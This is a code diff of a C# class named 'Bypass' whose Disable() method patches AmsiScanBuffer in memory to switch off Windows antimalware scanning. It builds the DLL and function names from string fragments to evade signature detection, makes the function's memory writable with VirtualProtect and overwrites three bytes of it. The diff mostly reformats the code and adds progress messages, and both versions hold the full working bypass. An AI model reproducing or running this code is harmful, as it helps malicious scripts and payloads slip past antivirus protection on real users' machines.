@@ -18,46 +18,46 @@ namespace Bypass
 
         public static int Disable()
         {	
-          string dllName = "am";
-          string dllName2 = "si";
-          dllName = dllName + dllName2 + "dll";
-          IntPtr TargetDLL = LoadLibrary(dllName);
-          if (TargetDLL == IntPtr.Zero)
-          {
-              Console.WriteLine("ERROR: Could not retrieve " + dllName + " pointer.");
-              return 1;
-          }
+			string dllName = "am";
+			dllName = "am" + "si" + ".dll";
+            IntPtr TargetDLL = LoadLibrary(dllName);
+            if (TargetDLL == IntPtr.Zero)
+            {
+                Console.WriteLine("ERROR: Could not retrieve -> " + dllName + " pointer.");
+                return 1;
+            }
+			Console.WriteLine("[+] siam LoadLibrary");
+			string funName = "Am";
+			funName += "si";
+			funName += "S"+"c"+"a"+"n";
+			funName += "Buffer";
+            IntPtr SiamScanBufferPtr = GetProcAddress(TargetDLL, funName);
+            if (SiamScanBufferPtr == IntPtr.Zero)
+            {
+                Console.WriteLine("ERROR: Could not retrieve " + funName + " function pointer");
+                return 1;
+            }
+			Console.WriteLine("[+] siam GetProcAddress");
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+            if (!VirtualProtect(SiamScanBufferPtr, dwSize, 0x40, out Zero))
+            {
+                Console.WriteLine("ERROR: Could not change SiamScanBuffer memory permissions!");
+                return 1;
+            }
+			Console.WriteLine("[+] siam VirtualProtect");
+            /*
+             * This is a new technique, and is still working.
+             * Source: https://www.cyberark.com/threat-research-blog/asmi-bypass-redux/
+             */
+            Byte[] Patch = { 0x31, 0xff, 0x90 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            MoveMemory(SiamScanBufferPtr + 0x001b, unmanagedPointer, 3);
 
-          string funName = "Am";
-          funName += "si";
-          funName += "S"+"c"+"a"+"n";
-          funName += "Buffer";
-          IntPtr SiamScanBufferPtr = GetProcAddress(TargetDLL, funName);
-          if (SiamScanBufferPtr == IntPtr.Zero)
-          {
-              Console.WriteLine("ERROR: Could not retrieve " + funName + " function pointer");
-              return 1;
-          }
-
-          UIntPtr dwSize = (UIntPtr)5;
-          uint Zero = 0;
-          if (!VirtualProtect(SiamScanBufferPtr, dwSize, 0x40, out Zero))
-          {
-              Console.WriteLine("ERROR: Could not change SiamScanBuffer memory permissions!");
-              return 1;
-          }
-
-          /*
-           * This is a new technique, and is still working.
-           * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
-           */
-          Byte[] Patch = { 0x31, 0xff, 0x90 };
-          IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-          Marshal.Copy(Patch, 0, unmanagedPointer, 3);
-          MoveMemory(SiamScanBufferPtr + 0x001b, unmanagedPointer, 3);
-
-          Console.WriteLine("SiamScanBuffer patch has been applied.");
-          return 0;
-      }
+            Console.WriteLine("[+] siam Patched");
+            return 0;
+        }
     }
 }
+
